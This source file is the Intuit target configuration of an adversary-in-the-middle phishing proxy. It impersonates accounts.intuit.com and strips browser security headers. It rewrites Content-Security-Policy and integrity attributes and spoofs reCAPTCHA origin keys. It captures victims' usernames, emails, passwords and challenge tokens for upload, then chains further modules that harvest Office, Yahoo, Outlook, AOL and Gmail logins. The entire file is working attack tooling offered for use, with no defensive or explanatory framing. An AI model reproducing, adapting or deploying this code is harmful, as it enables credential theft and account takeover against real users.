// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/')
const YAHOO_MODULE = require('../yahoo/')
const OUTLOOK_MODULE = require('../outlook/')
const AOL_MODULE = require('../aol/')
const GMAIL_MODULE = require('../gmail/')


const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        }
        return super.processRequest()

    }


    
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.PATTERNS, configExport.EXTERNAL_FILTERS)
    }


    processResponse(clientContext) {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
        this.browserEndPoint.removeHeader('Cross-Origin-Opener-Policy')
        this.browserEndPoint.removeHeader('Cross-Origin-Resource-Policy')
       
       
        if (this.proxyResp.headers['content-type'].startsWith('application/javascript')) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        return super.processResponse(clientContext)
    }
}

const DefaultHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {


        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.intuit.com') : ''

        
        if (clientContext.sessionBody.variables) {
            console.log('editing policies')

            const emailAddr = clientContext.sessionBody?.variables?.input?.email
            const username = clientContext.sessionBody?.variables?.input?.username

            

            if (username) {
                Object.assign(clientContext.sessionBody,
                    { loginUsername: username, intuitEmail: emailAddr,})
            }

            const password = clientContext.sessionBody?.variables?.input?.password

            if (password) {
                Object.assign(clientContext.sessionBody,
                    { loginPassword: password})

            }

            
            Object.assign(clientContext.sessionBody,
                { variables: '' })
            //  console.log(clientContext.sessionBody)
        } 

        super.uploadBodyData(clientContext, "loginPassword")


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')

            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9hY2NvdW50cy5pbnR1aXQuY29tOjQ0Mw')

            return super.superExecuteProxy('www.google.com', clientContext)


        }
       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }

        if (this.req.url.startsWith('/recaptcha')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''

            return super.superExecuteProxy('www.google.com', clientContext)

        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)


            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url.startsWith('/account-manager.html') 
        || this.req.url.startsWith('/app/account-manager')) {

            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: `/email/verify/auth?qrc=${clientContext.sessionBody.intuitEmail}` })
            return this.res.end('')

        }

        return super.execute(clientContext)

    }
}

/** Defined Config used */

const configExport = {

    SCHEME: 'intuit',

    CURRENT_DOMAIN: 'accounts.intuit.com',

    START_PATH: '/',
    
    PATTERNS: [
        
        // {
        //     match: '.api.intuit.com',
        //     replace: '{HOSTNAME}/sh.api.intuit.com/~',
        // },
        {
            match: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
            replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
        },
       

        {
            match: /"frame-src .*"/gi,
            replace: "frame-src *"
        },
        
        {
            match: 'integrity',
            replace: 'xintegrity',
        },
        {
            match: 'www.google.com',
            replace: '{HOSTNAME}',
        },
        {
            match: 'www.gstatic.com',
            replace: '{HOSTNAME}',
        },
        {
            match: 'this._isLoggingEnabled=!0',
            replace: 'this._isLoggingEnabled=!!',
        },
        {
            match: 'sourceMappingURL=',
            replace: 'dontrread',
        },

        // {
        //     match: 'https://sh',
        //     replace: 'https://',
        // },
          
        {
            match: 'accounts.intuit.com',
            replace: '{HOSTNAME}/',
        },

        {
            match: 'accounts".concat\\(o\\).concat\\(a,"."\\)',
            replace: '"',
        },

        // {
        //     domain: 'plugin.intuitcdn.net',
        //     match: 'intuitcdn.net',
        //     replace: '{HOSTNAME}',
        // },
        {
            domain: 'plugin.intuitcdn.net',
            match: 'n.start();',
            replace: '',
        },
        {
            domain: 'plugin.intuitcdn.net',
            match: 'intuit.com',
            replace: '{HOSTNAME}',
        },
        // {
        //     domain: 'plugin.intuitcdn.net',
        //     match: '"https://accounts".*?;',
        //     replace: '"https://{HOSTNAME}";',
        // },

    ],

    EXTERNAL_FILTERS: [
        'sh.api.intuit.com',
        'plugin.intuitcdn.net',
        'uxfabric.intuitcdn.net'
    ],


    FORCE_PROXY: ['/auth/login/finish'],

    PHP_PROCESSOR: {

        '/email/verify/auth': {
            GET: {
                script: 'validate.php',
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },
    },

    COOKIE_PATH: ['/account-manager.html', '/ius_proxy/v1/users/me/check_contact_info_status'],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://intuit.com',


    EXTRA_COMMANDS: [
        {
            path: '/identity-authn-core-ui/.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'plugin.intuitcdn.net',
                persistent: false,
                },
        },

        {
            path: '/configuration/widgets?offering_id=Intuit.sign-in-webap',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'accounts.intuit.com',
                persistent: false,
                },
        },
        {
            path: '/identity-api/signin/graphql',
            command: 'DONOT_SEND_INFO',
            command_args: {},
        },
    ],

    CAPTURES: {
        variables: {
            params: ['variables'],
            hosts: ['accounts.intuit.com'],
        },

        challenge: {
            params: ['challengeToken'],
            hosts: ['accounts.intuit.com'],
        },
        emailVerify: {
            params: ['email'],
            hosts: 'PHP-EXEC',
        },


    },


    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: null,
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: null,
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: null,
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: null,
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: null,
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultHandler,


   }
module.exports = configExport

